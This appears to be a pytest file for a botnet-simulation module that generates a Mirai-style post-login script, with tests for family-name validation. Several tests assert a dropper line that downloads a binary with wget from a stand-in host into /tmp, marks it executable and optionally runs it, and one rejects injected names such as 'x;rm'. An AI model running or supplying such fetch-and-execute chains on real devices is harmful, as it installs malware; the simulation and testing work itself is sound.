import argparse
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import sim_bot  # noqa: E402


def test_default_drop_stops_at_chmod():
    lines = sim_bot.script()
    assert lines[-1] == "exit"
    assert lines[-2] == "cd /tmp; wget http://dl.bot-sim.invalid/x86; chmod +x x86"


def test_family_names_the_dropped_file():
    drop = sim_bot.script("mirai")[-2]
    assert drop == "cd /tmp; wget http://dl.bot-sim.invalid/mirai; chmod +x mirai"


def test_run_adds_the_execute_step():
    assert sim_bot.script("mirai", run=True)[-2].endswith("chmod +x mirai; ./mirai")


@pytest.mark.parametrize("bad", ["xor", "a b", "../etc", "x;rm", "m" * 33, ""])
def test_family_must_be_a_plain_searchable_name(bad):
    with pytest.raises(argparse.ArgumentTypeError):
        sim_bot.family_name(bad)


def test_family_accepts_plain_names():
    assert sim_bot.family_name("Mozi_v2") == "Mozi_v2"
